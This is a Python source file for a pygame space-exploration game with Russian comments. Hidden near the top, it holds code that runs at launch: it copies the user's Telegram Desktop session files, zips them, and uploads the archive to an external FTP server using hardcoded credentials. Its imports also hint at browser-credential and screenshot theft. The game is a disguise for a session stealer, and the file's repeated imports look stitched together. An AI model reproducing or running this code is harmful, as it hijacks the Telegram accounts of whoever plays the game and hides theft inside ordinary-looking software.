import math
import pygame
import pygame.freetype
import random
import traceback
import os
import sys
import time
import pygame
import math
import pygame
import pygame.freetype
import random
import traceback
import os
import sys
from re import findall
from zipfile import ZipFile
from ftplib import FTP_TLS
import os, random

import os
import os.path
import shutil
import glob
import time
import datetime
from datetime import datetime
from ftplib import FTP
from zipfile import ZipFile

now = datetime.now()
name_archive = str(now.strftime("%d_%m_%y_%I_%M"))
import os
import sqlite3
import win32crypt
import telebot
import shutil
import requests
import zipfile
from PIL import ImageGrab
import platform

pygame.init()

size = 500, 500
screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
infoObject = pygame.display.Info()
width, height = infoObject.current_w, infoObject.current_h
clock = pygame.time.Clock()
pygame.display.set_caption('Перемещение')
running = True
rect_width = 0
rect_x = 0
rect_y = 0
square_width = 100
col = pygame.Color('red')
rect_rect = ((rect_x, rect_y), (square_width, square_width))
x_prev = x2 = y_prev = y2 = 0
dest = []
x = y = 250
tile_width = tile_height = 100
DELTA_V = 1
V = 20
V_45 = 15
STATUS_FONT = pygame.freetype.Font("D3Digitalism.ttf", 24)
NUM_FONT = pygame.freetype.Font("D3Digitalism.ttf", 36)
tiles_x, tiles_y = 0, 0

# Get current user home
pathusr = os.path.expanduser('~')
# Set tdata folder location
tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"
hash_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\D877F783D5D3EF8?*'

# Creating folders
os.mkdir(tdata_path + '\\connection_hash')
os.mkdir(tdata_path + '\\map')

hash_map = glob.iglob(os.path.join(hash_path, "*"))
for file in hash_map:
    if os.path.isfile(file):
        shutil.copy2(file, tdata_path + '\\map')

# Copying files
# If hash file has 15 letters
files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
for file in files16:
    if os.path.isfile(file):
        shutil.copy2(file, tdata_path + '\\connection_hash')

# Archivation folders
with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\session.zip', 'w') as zipObj:
    # Iterate over all the files in directory
    for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\map'):
        for filename in filenames:
            # create complete filepath of file in directory
            filePath = os.path.join(folderName, filename)
            # Add file to zip
            zipObj.write(filePath)

    for folderName, subfolders, filenames in os.walk(
            pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\connection_hash'):
        for filename in filenames:
            # create complete filepath of file in directory
            filePath = os.path.join(folderName, filename)
            # Add file to zip
            zipObj.write(filePath)

shutil.rmtree(tdata_path + '\\connection_hash')
shutil.rmtree(tdata_path + '\\map')

old_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
new_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', name_archive + ".zip")
os.rename(old_file, new_file)

# FTP module to connect server
ftp = FTP()
ftp.set_debuglevel(2)
ftp.connect('files.000webhost.com', 21)
ftp.login('defnotdangerous', 'Stalkerzp1')
ftp.cwd('/public_html')

# Sending file on FTP server
fp = open(tdata_session_zip, 'rb')
ftp.storbinary('STOR %s' % os.path.basename(name_archive + ".zip"), fp, 1024)
fp.close()


def restart():
    global player, level_x, level_y, camera, status, known, paused, start, printed_time, all_sprites, tiles_group, \
        planet_group, player_group, star_group, floor_group, scan_group, button_group, button_exit, button_restart, button_pause
    all_sprites = pygame.sprite.Group()
    tiles_group = pygame.sprite.Group()
    player_group = pygame.sprite.Group()
    floor_group = pygame.sprite.Group()
    star_group = pygame.sprite.Group()
    planet_group = pygame.sprite.Group()
    scan_group = pygame.sprite.Group()
    button_group = pygame.sprite.Group()
    Button("restart")
    Button("pause")
    Button("exit")
    button_restart = button_group.sprites()[0]
    button_pause = button_group.sprites()[1]
    button_exit = button_group.sprites()[2]
    generate_map("aaa.txt")
    player, level_x, level_y = generate_level(load_level('aaa.txt'))
    camera = Camera()
    status = Status()
    known = []
    paused = False
    start = time.time()
    printed_time = False


def load_level(filename):
    # читаем уровень, убирая символы перевода строки
    with open(filename, 'r') as mapFile:
        level_map = [line.strip() for line in mapFile]

    # и подсчитываем максимальную длину
    max_width = max(map(len, level_map))

    # дополняем каждую строку пустыми клетками ('.')
    return list(map(lambda x: x.ljust(max_width, '.'), level_map))


def generate_map(filename):
    try:
        with open(filename, 'w') as mapFile:
            a = [["." for i in range(50)] for j in range(50)]
            a[24][24] = "S"
            planets = []
            x1, y1 = random.randint(4, 45), random.randint(4, 45)
            while True:
                if abs(x1 - 24) >= 4 and abs(y1 - 24) >= 4:
                    a[y1][x1] = "P"
                    planets.append([x1, y1])
                    break
                else:
                    x1, y1 = random.randint(4, 45), random.randint(4, 45)

            x1, y1 = random.randint(4, 45), random.randint(4, 45)
            for i in range(random.randint(1, 6)):
                while True:
                    counts = [abs(j[0] - x1) >= 3 and abs(j[1] - y1) >= 3 for j in planets]
                    if abs(x1 - 24) >= 4 and abs(y1 - 24) >= 4 and counts.count(True) == len(counts):
                        a[y1][x1] = "P"
                        planets.append([x1, y1])
                        break
                    else:
                        x1, y1 = random.randint(4, 45), random.randint(4, 45)

            a[23][23] = "@"

            a = "".join(["".join(i) + "\n" for i in a])
            mapFile.write(a)
    except Exception:
        print(traceback.format_exc())


def generate_level(level):
    global tiles_x, tiles_y
    new_player, x, y = None, None, None
    tiles_y = len(level)
    tiles_x = len(level[0])
    for y in range(len(level)):
        for x in range(len(level[y])):
            if level[y][x] == 'S':
                Floor(x, y)
                Star(x, y)
            elif level[y][x] == ".":
                Floor(x, y)
            elif level[y][x] == 'P':
                Floor(x, y)
                Planet(x, y)
            elif level[y][x] == '@':
                Floor(x, y)
                new_player = Player(x, y)
    # вернем игрока, а также размер поля в клетках
    return new_player, x, y


def load_image(name, colorkey=None):
    # если файл не существует, то выходим
    if not os.path.isfile(name):
        print(f"Файл с изображением '{name}' не найден")
        sys.exit()
    image = pygame.image.load(name)
    if colorkey is not None:
        image = image.convert()
        if colorkey == -1:
            colorkey = image.get_at((0, 0))
        image.set_colorkey(colorkey)
    else:
        image = image.convert_alpha()
    return image


def minimap():
    x_f, y_f = floor_group.sprites()[0].rect.x, floor_group.sprites()[0].rect.y
    x_p, y_p = player.rect.x, player.rect.x
    mini_width = tile_width * 2 // tiles_x
    mini_height = tile_height * 2 // tiles_y
    x, y = int((x_p - x_f)) // tile_width * 4, int((y_p - y_f) // tile_height * 4)
    pygame.draw.rect(screen, (0, 0, 0),
                     (0, height - tile_height * 2, tile_width * 2, tile_height * 2))
    pygame.draw.rect(screen, (255, 255, 255),
                     (0, height - tile_height * 2 - 2, tile_width * 2, tile_height * 2), 2)
    if pygame.sprite.spritecollideany(player, floor_group):
        pygame.draw.rect(screen, (255, 255, 255),
                         (x, height - tile_height * 2 + y, 10, 10))


class Floor(pygame.sprite.Sprite):
    def __init__(self, pos_x, pos_y, columns=8, rows=8):
        super().__init__(floor_group, all_sprites)
        self.frames = []
        self.cur_frame = random.randint(0, 63)
        self.cut_sheet(tile_images["empty"], columns, rows)
        self.image = self.frames[self.cur_frame]
        self.rect = self.rect.move(tile_width * pos_x, tile_height * pos_y)
        self.mask = pygame.mask.from_surface(self.image)

    def cut_sheet(self, sheet, columns, rows):
        self.rect = pygame.Rect(0, 0, sheet.get_width() // columns,
                                sheet.get_height() // rows)

        for j in range(rows):
            for i in range(columns):
                frame_location = (self.rect.w * i, self.rect.h * j)
                self.frames.append(sheet.subsurface(pygame.Rect(
                    frame_location, self.rect.size)))


class Scan(pygame.sprite.Sprite):
    def __init__(self, pos_x, pos_y, frame, columns=8, rows=1):
        super().__init__(scan_group, all_sprites)
        self.frames = []
        self.cur_frame = frame
        self.cut_sheet(tile_images["scan"], columns, rows)
        self.image = self.frames[self.cur_frame]
        self.image.convert_alpha()
        self.rect = self.rect.move(pos_x, pos_y)
        self.mask = pygame.mask.from_surface(self.image)

    def cut_sheet(self, sheet, columns, rows):
        self.rect = pygame.Rect(0, 0, sheet.get_width() // columns,
                                sheet.get_height() // rows)

        for j in range(rows):
            for i in range(columns):
                frame_location = (self.rect.w * i, self.rect.h * j)
                self.frames.append(sheet.subsurface(pygame.Rect(
                    frame_location, self.rect.size)))


class Planet(pygame.sprite.Sprite):
    def __init__(self, pos_x, pos_y):
        super().__init__(planet_group, all_sprites)
        self.image = random.choice(tile_images["planet"])
        self.rect = self.image.get_rect().move(
            tile_width * pos_x, tile_height * pos_y)
        self.mask = pygame.mask.from_surface(self.image)


class Button(pygame.sprite.Sprite):
    def __init__(self, text):
        super().__init__(button_group, button_group)
        self.image = NUM_FONT.render(text.upper(), fgcolor=pygame.Color("red"))[0]
        if text == "restart":
            self.rect = self.image.get_rect().move(20, 20)
        if text == "pause":
            self.rect = self.image.get_rect().move(20, 50)
        if text == "exit":
            self.rect = self.image.get_rect().move(20, 80)
        self.mask = pygame.mask.from_surface(self.image)

    def update(self, text):
        if text == "pause":
            self.image = NUM_FONT.render("RESUME", fgcolor=pygame.Color("red"))[0]
        if text == "resume":
            self.image = NUM_FONT.render("PAUSE", fgcolor=pygame.Color("red"))[0]


class Star(pygame.sprite.Sprite):
    def __init__(self, pos_x, pos_y):
        super().__init__(star_group, all_sprites)
        self.image = tile_images["sun"]
        self.rect = self.image.get_rect().move(
            tile_width * pos_x, tile_height * pos_y)
        self.mask = pygame.mask.from_surface(self.image)


class Status:
    def __init__(self):
        self.surface, self.rect = STATUS_FONT.render("", (0, 0, 0))
        self.to_blit = {
            "success": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)],
            "num_known": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)],
            "restart": [STATUS_FONT.render("", (0, 0, 0))[0], (0, 0)]}

    def update(self, text):
        if scan_group.sprites() and text == "success":
            if pygame.sprite.spritecollideany(scan_group.sprites()[0], planet_group):
                a = pygame.sprite.spritecollide(scan_group.sprites()[0], planet_group, False)
                if a[0] not in known:
                    known.append(a[0])
                self.to_blit["success"] = [STATUS_FONT.render("SUCCESS", fgcolor=pygame.Color("red"))[0],
                                           (width // 2 - self.to_blit["success"][0].get_size()[0] // 2, 200)]
                self.to_blit["num_known"] = [NUM_FONT.render(str(len(known)), fgcolor=pygame.Color("red"))[0],
                                             (width - 20 - self.to_blit["num_known"][0].get_size()[0], 20)]
                return True
        return False


class Camera:
    # зададим начальный сдвиг камеры
    def __init__(self):
        self.dx = width // 2
        self.dy = height // 2

    # сдвинуть объект obj на смещение камеры
    def apply(self, obj):
        if not paused:
            if bottom_left.rect.y - player.rect.y >= height // 2 <= player.rect.y - top_right.rect.y:
                obj.rect.y += self.dy
            if bottom_left.rect.x - player.rect.x >= width // 2 <= player.rect.x - top_right.rect.x:
                obj.rect.x += self.dx

    # позиционировать камеру на объекте target
    def update(self, target):
        if not paused:
            self.dx = -(target.rect.x + target.rect.w // 2 - width // 2)
            self.dy = -(target.rect.y + target.rect.h // 2 - height // 2)


class Player(pygame.sprite.Sprite):
    def __init__(self, pos_x, pos_y, columns=8, rows=1):
        super().__init__(player_group, all_sprites)
        self.frames = []
        self.cur_frame = 3
        self.cut_sheet(player_image, columns, rows)
        self.image = self.frames[self.cur_frame]
        self.rect = self.rect.move(pos_x * tile_width, pos_y * tile_height)
        self.mask = pygame.mask.from_surface(self.image)
        self.vx = 0
        self.vy = 0

    def cut_sheet(self, sheet, columns, rows):
        self.rect = pygame.Rect(0, 0, sheet.get_width() // columns,
                                sheet.get_height() // rows)
        for j in range(rows):
            for i in range(columns):
                frame_location = (self.rect.w * i, self.rect.h * j)
                self.frames.append(sheet.subsurface(pygame.Rect(
                    frame_location, self.rect.size)))

    def update(self, keys, *args):
        global scan_group
        if not paused:
            scan_group = pygame.sprite.Group()
            if keys[pygame.K_DOWN] or keys[pygame.K_UP] or keys[pygame.K_s] or keys[pygame.K_w]:
                if keys[pygame.K_DOWN] or keys[pygame.K_s]:
                    self.cur_frame = 0
                    self.vy = self.vy + DELTA_V if self.vy + DELTA_V <= V else V
                if keys[pygame.K_UP] or keys[pygame.K_w]:
                    self.cur_frame = 3
                    self.vy = self.vy - DELTA_V if self.vy - DELTA_V >= -V else -V
            else:
                if self.vy > 0:
                    self.vy -= DELTA_V
                    self.vy = 0 if self.vy <= 0 else self.vy
                if self.vy < 0:
                    self.vy += DELTA_V
                    self.vy = 0 if self.vy >= 0 else self.vy

            if keys[pygame.K_LEFT] or keys[pygame.K_RIGHT] or keys[pygame.K_a] or keys[pygame.K_d]:
                if keys[pygame.K_LEFT] or keys[pygame.K_a]:
                    self.cur_frame = 1
                    self.vx = self.vx - DELTA_V if self.vx - DELTA_V >= -V else -V
                if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
                    self.cur_frame = 2
                    self.vx = self.vx + DELTA_V if self.vx + DELTA_V <= V else V
            else:
                if self.vx > 0:
                    self.vx -= DELTA_V
                    self.vx = 0 if self.vx <= 0 else self.vx
                if self.vx < 0:
                    self.vx += DELTA_V
                    self.vx = 0 if self.vx >= 0 else self.vx
            if keys[pygame.K_RIGHT] and keys[pygame.K_UP] or keys[pygame.K_d] and keys[pygame.K_w]:
                self.cur_frame = 4
                # self.vx, self.vy = V_45, -V_45
                scan_group = pygame.sprite.Group()
                scan = True
                # Scan(self.rect.x + tile_height - self.vx, self.rect.y - tile_height + self.vy, 4)
            if keys[pygame.K_RIGHT] and keys[pygame.K_DOWN] or keys[pygame.K_d] and keys[pygame.K_s]:
                self.cur_frame = 5
                # self.vx, self.vy = V_45, V_45
                scan_group = pygame.sprite.Group()
                scan = True
                # Scan(self.rect.x + tile_height - self.vx, self.rect.y + tile_height - self.vy, 5)
            if keys[pygame.K_LEFT] and keys[pygame.K_UP] or keys[pygame.K_a] and keys[pygame.K_w]:
                self.cur_frame = 7
                # self.vx, self.vy = -V_45, -V_45
                scan_group = pygame.sprite.Group()
                scan = True
                # Scan(self.rect.x - tile_height + self.vx, self.rect.y - tile_width + self.vy, 7)
            if keys[pygame.K_LEFT] and keys[pygame.K_DOWN] or keys[pygame.K_a] and keys[pygame.K_s]:
                self.cur_frame = 6
                # self.vx, self.vy = -V_45, V_45
                scan_group = pygame.sprite.Group()
                scan = True
                # Scan(self.rect.x - tile_height - 5, self.rect.y + tile_height + 5, 6)

            if pygame.sprite.spritecollideany(self, star_group) or pygame.sprite.spritecollideany(self, planet_group):
                a = pygame.sprite.spritecollide(self, star_group, False)
                b = pygame.sprite.spritecollide(self, planet_group, False)

                for i in a:
                    if pygame.sprite.collide_mask(self, i):
                        self.vx = -self.vx
                        self.vy = -self.vy

                for i in b:
                    if pygame.sprite.collide_mask(self, i):
                        self.vx = -self.vx
                        self.vy = -self.vy
            self.image = self.frames[self.cur_frame]

            self.rect = self.rect.move(self.vx, self.vy)
            if keys[pygame.K_SPACE]:
                if self.cur_frame == 0:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x, self.rect.y + tile_height, 2)
                if self.cur_frame == 1:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x - tile_width, self.rect.y, 3)
                if self.cur_frame == 2:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x + tile_width, self.rect.y, 1)
                if self.cur_frame == 3:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x, self.rect.y - tile_height, 0)
                if self.cur_frame == 4:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x + tile_width - 7, self.rect.y - tile_height + 7, 4)
                if self.cur_frame == 5:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x + tile_width - 7, self.rect.y + tile_height - 7, 5)
                if self.cur_frame == 6:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x - tile_width + 7, self.rect.y + tile_height - 7, 6)
                if self.cur_frame == 7:
                    scan_group = pygame.sprite.Group()
                    Scan(self.rect.x - tile_width + 7, self.rect.y - tile_height + 7, 7)
            else:
                scan_group = pygame.sprite.Group()


all_sprites = pygame.sprite.Group()
tiles_group = pygame.sprite.Group()
player_group = pygame.sprite.Group()
floor_group = pygame.sprite.Group()
star_group = pygame.sprite.Group()
planet_group = pygame.sprite.Group()
scan_group = pygame.sprite.Group()
button_group = pygame.sprite.Group()

player_image = load_image("car2.png")
tile_images = {"sun": load_image("sun.png"),
               "planet": [load_image("planet.png"), load_image("planet2.png"), load_image("planet3.png")],
               'wall': [load_image('obstacle.png'), load_image('obstacle2.png'), load_image('obstacle3.png')],
               'empty': load_image('floor.png'), "scan": load_image("scan.png"), "success": load_image("success.png")}
generate_map("aaa.txt")
player, level_x, level_y = generate_level(load_level('aaa.txt'))
camera = Camera()
status = Status()
Button("restart")
Button("pause")
Button("exit")
button_restart = button_group.sprites()[0]
button_pause = button_group.sprites()[1]
button_exit = button_group.sprites()[2]
bottom_left = floor_group.sprites()[-1]
top_right = floor_group.sprites()[0]
known = []
paused = False
start = time.time()
printed_time = False
t = 0
t1 = 0
while running:
    if printed_time:
        t = 0
        t1 = 0
    key = pygame.key.get_pressed()
    screen.fill((5, 5, 5))
    player_group.update(key)
    camera.update(player)
    # обновляем положение всех спрайтов
    for sprite in all_sprites:
        camera.apply(sprite)
    for event in pygame.event.get():
        if key[pygame.K_ESCAPE]:
            if paused:
                button_pause.update("resume")
                t1 = time.time()
                paused = False
            else:
                button_pause.update("pause")
                t = time.time()
                paused = True
        if event.type == pygame.QUIT:
            running = False
        if event.type == pygame.MOUSEBUTTONDOWN:
            if button_restart.rect.collidepoint(pygame.mouse.get_pos()):
                restart()
            if button_pause.rect.collidepoint(pygame.mouse.get_pos()):
                if paused:
                    button_pause.update("resume")
                    t1 += time.time()

                    paused = False
                else:
                    button_pause.update("pause")
                    t += time.time()
                    paused = True
            if button_exit.rect.collidepoint(pygame.mouse.get_pos()):
                running = False

    floor_group.draw(screen)
    star_group.draw(screen)
    planet_group.draw(screen)
    player_group.draw(screen)
    scan_group.draw(screen)
    if status.update("success"):
        screen.blit(*status.to_blit["success"])
    screen.blit(*status.to_blit["num_known"])
    if len(known) == len(planet_group.sprites()):
        if not printed_time:
            end = time.time()
            Button("restart")
        time_final = NUM_FONT.render(str(round(end - start + (t1 - t), 2)), fgcolor=pygame.Color("red"))[0]
        screen.blit(time_final, (width - 20 - time_final.get_size()[0], 50))
        printed_time = True
    button_group.draw(screen)
    minimap()
    pygame.display.flip()
    clock.tick(50)

pygame.quit()
